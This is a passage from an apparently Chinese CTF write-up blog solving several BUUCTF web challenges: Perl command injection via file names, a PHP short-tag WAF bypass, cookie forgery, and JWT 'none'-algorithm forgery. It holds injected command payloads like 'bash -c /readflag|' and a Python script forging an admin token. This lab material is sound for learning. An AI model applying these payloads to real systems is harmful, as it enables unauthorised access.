class="line">	    <span class="keyword">my</span> $content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	    <span class="keyword">my</span> $bytes = <span class="keyword">sysread</span>($fh, $content, $size);</span><br><span class="line">	    <span class="keyword">return</span> \$content <span class="keyword">if</span> $bytes &gt; <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">return</span> \ <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;);</span><br><span class="line">	<span class="keyword">close</span>($fh);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以看到，它在打开文件时加了个&lt;符号。这也正是我们修复这个漏洞的办法，现在我们要复现就先将她删掉吧。那一行改成open(my $fh, $path) or return new 。再来按照刚刚的思路就可以运行了。good,也算是解决了一个难题了。Kali环境是个好东西，哈哈。</p>
<p><strong>解题步骤：</strong><br>第一次使用?url&#x3D;file:ls &#x2F;|&amp;filename&#x3D;ls &#x2F;| 第一次是为了创建ls &#x2F;| ,<code>ls/|</code>并不是一个文件，而是一个目录，是ls目录下有|文件，这个要理清一下：<br>下面的结果分别是：<code>pathinfo($_GET[&quot;filename&quot;]);</code>，<code>basename($info[&quot;dirname&quot;]</code>，<code>basename($info[&quot;basename&quot;]</code>的值<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667300006614-39159f96-20c4-4f93-b63a-7ce29a1783a8.png#averageHue=%23fefefd&clientId=uaecbda7a-1957-4&from=paste&height=276&id=ub39a7c3b&name=image.png&originHeight=345&originWidth=668&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22204&status=done&style=none&taskId=ub1ee272f-912f-4507-8f5a-113491ca526&title=&width=534.4" alt="image.png"><br>在自己的vps上也测试了一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667300105932-f0f3e6f2-0bbd-4aaf-815a-9649589829b3.png#averageHue=%23f5f5f5&clientId=uaecbda7a-1957-4&from=paste&height=230&id=uaa549a05&name=image.png&originHeight=287&originWidth=1306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29652&status=done&style=none&taskId=u0ddbc3c3-08ab-44a7-893f-385c8ee219d&title=&width=1044.8" alt="image.png"><br>第二次使用?url&#x3D;file:ls &#x2F;|&amp;filename&#x3D;123，是为了执行命令，并且将结果写入123文件：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667299720098-617580fb-ebcf-4aff-9220-5b11409665aa.png#averageHue=%231c1c1c&clientId=uaecbda7a-1957-4&from=paste&height=74&id=u6147cd0a&name=image.png&originHeight=93&originWidth=431&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4400&status=done&style=none&taskId=u975f6f5f-fe53-4ad6-bef8-fbaddf6815d&title=&width=344.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667299726234-e258ca25-238e-4928-a89a-2aa0030bc84c.png#averageHue=%23202020&clientId=uaecbda7a-1957-4&from=paste&height=50&id=ua01d423a&name=image.png&originHeight=62&originWidth=494&originalType=binary&ratio=1&rotation=0&showTitle=false&size=4593&status=done&style=none&taskId=u39c02c23-ba20-4415-b941-7caf062a347&title=&width=395.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667299736840-c8b4bd30-9ccf-4791-9de4-08c60caac78e.png#averageHue=%23fafaf9&clientId=uaecbda7a-1957-4&from=paste&height=170&id=u5178d61d&name=image.png&originHeight=213&originWidth=1228&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29548&status=done&style=none&taskId=uf428b56f-4209-41a3-9fbe-6bba2622505&title=&width=982.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667299732311-faf10fbe-668c-44ed-923a-5e8f776cda9b.png#averageHue=%23b6beb6&clientId=uaecbda7a-1957-4&from=paste&height=366&id=u17ad91e9&name=image.png&originHeight=458&originWidth=1598&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24563&status=done&style=none&taskId=u09e5daeb-db3c-48fa-ad02-ae058808d06&title=&width=1278.4" alt="image.png"><br>成功看到了根目录下的命令，发现flag没有权限读取，那肯定就是去运行readflag文件了：<br>先运行<code>?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code><br>再运<code>?url=file:bash -c /readflag|&amp;filename=123</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667299941161-8e2eef8a-07ac-4e7c-9069-816bf5c352c2.png#averageHue=%23f7f8f8&clientId=uaecbda7a-1957-4&from=paste&height=208&id=u7d4c7c1c&name=image.png&originHeight=260&originWidth=1609&originalType=binary&ratio=1&rotation=0&showTitle=false&size=26064&status=done&style=none&taskId=u4e468ba3-45e2-4a65-b406-9b3728493bc&title=&width=1287.2" alt="image.png"></p>
<p>听说还有个perl反弹shell，但是我这边buu上用不了：</p>
<h2 id="红明谷CTF-2021-write-shell"><a href="#红明谷CTF-2021-write-shell" class="headerlink" title="[红明谷CTF 2021]write_shell"></a>[红明谷CTF 2021]write_shell</h2><p>考点：PHP短标签</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">waf</span>(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = <span class="title function_ invoke__">check</span>(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">mkdir</span>(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>挺简单的题，没啥大道理，一个waf一个pwd读目录，一个upload写文件<br>直接上payload了：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354437966-0fdbdd03-f654-4c2b-a0c9-3d6b868bee6c.png#averageHue=%23e7c58a&clientId=ud38f3e31-0e95-4&from=paste&height=254&id=u99d90986&name=image.png&originHeight=318&originWidth=1398&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30084&status=done&style=none&taskId=u3923f55f-a79d-4550-85a6-148cbeae120&title=&width=1118.4" alt="image.png"><br>用短标签去绕过：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354535459-d63c5150-9178-4849-8845-b6a3d2887252.png#averageHue=%23fafbe0&clientId=ud38f3e31-0e95-4&from=paste&height=93&id=ub1f6dd6f&name=image.png&originHeight=116&originWidth=1399&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16667&status=done&style=none&taskId=u57fc93b2-dc79-460f-a671-86274623564&title=&width=1119.2" alt="image.png"></p>
<h2 id="watevrCTF-2019-Cookie-Store"><a href="#watevrCTF-2019-Cookie-Store" class="headerlink" title="[watevrCTF-2019]Cookie Store"></a>[watevrCTF-2019]Cookie Store</h2><p>考点：Cookie伪造<br>一个买cookie的界面；<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354626521-c2c11ebe-85db-489f-b5bf-9d898a6c2f98.png#averageHue=%23a48966&clientId=ud38f3e31-0e95-4&from=paste&height=393&id=u11d45008&name=image.png&originHeight=491&originWidth=1349&originalType=binary&ratio=1&rotation=0&showTitle=false&size=197106&status=done&style=none&taskId=u13caa92f-5383-430a-b06b-b7d885cb316&title=&width=1079.2" alt="image.png">并且可以看到我们有一个session：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354638503-3caf4c9d-e5a7-4ea9-9bfb-914f747d77ef.png#averageHue=%23eef0f1&clientId=ud38f3e31-0e95-4&from=paste&height=83&id=u983c617a&name=image.png&originHeight=104&originWidth=1726&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14119&status=done&style=none&taskId=u2bf37a94-2e5d-46da-821e-58f7df44eee&title=&width=1380.8" alt="image.png"><br>解密一下发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354739091-37926961-2c7a-490f-9529-adf02fc6bf89.png#averageHue=%23fbfafa&clientId=ud38f3e31-0e95-4&from=paste&height=284&id=u4177e865&name=image.png&originHeight=355&originWidth=1353&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33645&status=done&style=none&taskId=u0ed965d2-67c5-4a99-889b-98cd119e4d1&title=&width=1082.4" alt="image.png"><br>照猫画狗伪造一个：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354770012-c16b2f53-43be-4d23-b253-ff81ac78f625.png#averageHue=%23fcfcfb&clientId=ud38f3e31-0e95-4&from=paste&height=366&id=u7669cd3d&name=image.png&originHeight=458&originWidth=1038&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31390&status=done&style=none&taskId=u0585a30e-721e-47c4-877e-f74131440fc&title=&width=830.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354772757-ab2eff4f-88a0-4e6c-992b-c91b86a2f440.png#averageHue=%23f4efec&clientId=ud38f3e31-0e95-4&from=paste&height=114&id=uce400b65&name=image.png&originHeight=143&originWidth=870&originalType=binary&ratio=1&rotation=0&showTitle=false&size=53833&status=done&style=none&taskId=ufe0e3dae-ee0a-4cda-9867-859c951b07f&title=&width=696" alt="image.png"><br>买COOKIE：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667354779614-79e0536e-4c2c-4546-8941-842aecd91742.png#averageHue=%23fdfcfb&clientId=ud38f3e31-0e95-4&from=paste&height=70&id=u9845896d&name=image.png&originHeight=88&originWidth=690&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9478&status=done&style=none&taskId=u7aa666c3-a682-4307-8ebe-0b7742f5e9c&title=&width=552" alt="image.png"></p>
<h2 id="HFCTF2020-EasyLogin"><a href="#HFCTF2020-EasyLogin" class="headerlink" title="[HFCTF2020]EasyLogin"></a>[HFCTF2020]EasyLogin</h2><p>考点：JWT伪造<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667443155493-7af2e49c-5720-4823-b22f-536b15c9e1c9.png#averageHue=%23fafafa&clientId=u5150b8c4-54f2-4&from=paste&height=558&id=uf2087dc2&name=image.png&originHeight=697&originWidth=1332&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41710&status=done&style=none&taskId=u989cb75d-c196-43ae-a395-890395ba689&title=&width=1065.6" alt="image.png"><br>是一个登录界面，注册一个账号，尝试了注册admin，但是不让注册了，所以存在admin这个用户，我们注册个正常用户登录，登录的时候抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667443206747-eb7cddab-507c-47f6-9e74-0a28dcd8a2b4.png#averageHue=%23f6f4f4&clientId=u5150b8c4-54f2-4&from=paste&height=272&id=u810299e0&name=image.png&originHeight=340&originWidth=1310&originalType=binary&ratio=1&rotation=0&showTitle=false&size=74061&status=done&style=none&taskId=ufebdf48f-0446-4baf-bc92-3512d0f26de&title=&width=1048" alt="image.png"><br>其中的authorization就是JWT了，可以清晰的看到有3个点<br>对于jwt的知识可以看：</p>
<p>看大佬说是要读取<code>controllers/api.js</code>文件，就可以看到主要的逻辑代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">APIError</span> = <span class="built_in">require</span>(<span class="string">&#x27;../rest&#x27;</span>).<span class="property">APIError</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">    <span class="string">&#x27;POST /api/register&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || username === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;register error&#x27;</span>, <span class="string">&#x27;wrong username&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &gt; <span class="number">100000</span>) &#123;</span><br><span class="line">            <span class="variable language_">global</span>.<span class="property">secrets</span> = [];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = crypto.<span class="title function_">randomBytes</span>(<span class="number">18</span>).<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">        <span class="keyword">const</span> secretid = <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span>;</span><br><span class="line">        <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="title function_">push</span>(secret)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = jwt.<span class="title function_">sign</span>(&#123;secretid, username, password&#125;, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">token</span>: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;POST /api/login&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">const</span> &#123;username, password&#125; = ctx.<span class="property">request</span>.<span class="property">body</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!username || !password) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;username or password is necessary&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> token = ctx.<span class="property">header</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">body</span>.<span class="property">authorization</span> || ctx.<span class="property">request</span>.<span class="property">query</span>.<span class="property">authorization</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> sid = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(token.<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>()).<span class="property">secretid</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(sid)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> secret = <span class="variable language_">global</span>.<span class="property">secrets</span>[sid];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> user = jwt.<span class="title function_">verify</span>(token, secret, &#123;<span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span>&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> status = username === user.<span class="property">username</span> &amp;&amp; password === user.<span class="property">password</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(status) &#123;</span><br><span class="line">            ctx.<span class="property">session</span>.<span class="property">username</span> = username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/flag&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span>(ctx.<span class="property">session</span>.<span class="property">username</span> !== <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;permission error&#x27;</span>, <span class="string">&#x27;permission denied&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> flag = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            flag</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="string">&#x27;GET /api/logout&#x27;</span>: <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">        ctx.<span class="property">session</span>.<span class="property">username</span> = <span class="literal">null</span>;</span><br><span class="line">        ctx.<span class="title function_">rest</span>(&#123;</span><br><span class="line">            <span class="attr">status</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>利用方式：</strong></p>
<p>利用nodejs的jwt缺陷，当jwt的secret为空，jwt会采用algorithm为none进行解密。<br>js是弱语言类型，我们可以将secretid设置为一个小数或空数组（空数组与数字比较时为0）来绕过secretid的一个验证（不能为null&amp;undefined）.</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(sid === <span class="literal">undefined</span> || sid === <span class="literal">null</span> || !(sid &lt; <span class="variable language_">global</span>.<span class="property">secrets</span>.<span class="property">length</span> &amp;&amp; sid &gt;= <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">APIError</span>(<span class="string">&#x27;login error&#x27;</span>, <span class="string">&#x27;no such secret id&#x27;</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以把刚刚抓包的token去解密一下：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667443891175-f37094cf-55c4-4d63-9149-ea33b26cc6d0.png#averageHue=%23fdfdfd&clientId=u5150b8c4-54f2-4&from=paste&height=571&id=udd7602fe&name=image.png&originHeight=714&originWidth=1588&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81679&status=done&style=none&taskId=u128b9a41-ab0d-497c-bbb1-8dbeacd1869&title=&width=1270.4" alt="image.png"><br>然后我们就来伪造一下jwt：<br>python安装一下jwt库：<code>pip install pyjwt</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;secretid&quot;</span>: <span class="number">0.1</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1587287370</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">myToken = jwt.encode(payload, algorithm=<span class="string">&quot;none&quot;</span>, key=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(myToken)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444240514-411efb6d-e586-486c-9a84-4aa65a8a2e32.png#averageHue=%232f2e2d&clientId=u5150b8c4-54f2-4&from=paste&height=63&id=ua320cb4e&name=image.png&originHeight=79&originWidth=1409&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18527&status=done&style=none&taskId=u8bca801e-4b6e-4a82-8756-9297bdd6f2c&title=&width=1127.2" alt="image.png"><br>我们用这个token去登录admin<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444281089-1b333aec-1455-4240-b86f-14337a3445d8.png#averageHue=%23f5f4f3&clientId=u5150b8c4-54f2-4&from=paste&height=274&id=ub7a6f696&name=image.png&originHeight=343&originWidth=1321&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81197&status=done&style=none&taskId=u1edf9d4c-e814-41f1-be08-8b2aff961fd&title=&width=1056.8" alt="image.png"><br>返回了我们true，说明成功了，我们拿返回的sess:aok和sess:aok:sig去登录：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444511594-5ee5dcb4-f570-4924-8c28-c89d36f1bf3c.png#averageHue=%23fafafa&clientId=u5150b8c4-54f2-4&from=paste&height=362&id=u1d4e214a&name=image.png&originHeight=453&originWidth=1121&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31196&status=done&style=none&taskId=u0fe809a9-10f7-4dbd-8122-187ca07f832&title=&width=896.8" alt="image.png"><br>更换一下cookie就上去了，然后点getflag抓包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444523587-50a0f7ab-e9c2-4574-8dd4-3da797bd1b4e.png#averageHue=%23f7f6f6&clientId=u5150b8c4-54f2-4&from=paste&height=319&id=ua6bb2c0e&name=image.png&originHeight=399&originWidth=1174&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58514&status=done&style=none&taskId=u53faf3fa-6177-4628-bcbf-fc27b4e53b9&title=&width=939.2" alt="image.png"><br>总感觉jwt还是少了点知识，之后去补补，还是想先学会儿开发</p>
<h2 id="b01lers2020-Welcome-to-Earth"><a href="#b01lers2020-Welcome-to-Earth" class="headerlink" title="[b01lers2020]Welcome to Earth"></a>[b01lers2020]Welcome to Earth</h2><p>考点：前端JS<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444617397-8cd96219-53a8-4ff2-9012-5e1fcc02fa12.png#averageHue=%23787e79&clientId=u5150b8c4-54f2-4&from=paste&height=547&id=u2c2327d4&name=image.png&originHeight=684&originWidth=1362&originalType=binary&ratio=1&rotation=0&showTitle=false&size=891269&status=done&style=none&taskId=uf3ed9dc8-59bd-4605-b4bb-94e5ef7ef83&title=&width=1089.6" alt="image.png"><br>进去一张图，之后就立马跳转到：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1667444630852-cefccbec-8bc6-4aa2-b684-6be515c11f23.png#averageHue=%23747d78&clientId=u5150b8c4-54f2-4&from=paste&height=406&id=uf3d5527d&name=image.png&originHeight=507&originWidth=1519&originalType=binary&ratio=1&rotation=0&showTitle=false&size=849361&status=done&style=none&taskId=uf7183c6e-d3a8-4bf4-bc84-6ee42a310cc&title=&width=1215.2" alt="image.png"><br>看看源代码：<br><img 